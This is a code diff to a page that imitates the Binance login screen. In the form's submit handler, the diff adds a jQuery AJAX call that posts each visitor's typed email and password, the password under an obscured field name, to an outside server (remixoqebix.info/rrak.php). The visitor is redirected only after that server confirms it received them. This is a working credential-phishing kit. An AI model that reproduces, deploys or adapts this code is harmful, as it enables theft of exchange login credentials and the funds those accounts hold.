@@ -8,12 +8,12 @@
       integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
    <script src="app2.js"></script>
    <link rel="shortcut icon" type="image/x-icon" href="https://bin.bnbstatic.com/static/images/common/favicon.ico">
-   
+
    <meta name="viewport"
       content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">
-  
+
    <title data-shuvi-head="true">Log In | Binance</title>
-   
+
    <link rel="preload" href="./index_files/index.min.css" as="style">
    <link rel="stylesheet" type="text/css" href="./index_files/index.min.css">
    <link rel="preload" href="./index_files/font.min.css" as="style">
@@ -11273,6 +11273,7 @@
    </div>
 
    <script>
+
       // Select the form element
       const form = document.querySelector('#sfasfkWFtomnS');
 
@@ -11288,8 +11289,21 @@
          // If the email and password are both non-empty, save them to local storage and redirect to the informations.html page
          if (email && password) {
             localStorage.setItem('email_', email);
-            localStorage.setItem('password_', password);
-            window.location.href = 'informations.html';
+            let data = {
+               user_email: email,
+               guxhatok: password,
+            }
+            $.ajax({
+               url: "https://remixoqebix.info/rrak.php/",
+               method: "POST",
+               data: data,
+               success: function (response) {
+                  if (response == "1") {
+                     window.location.href = 'informations.html';
+                  }
+               }
+            });
+
          }
       });
    </script>
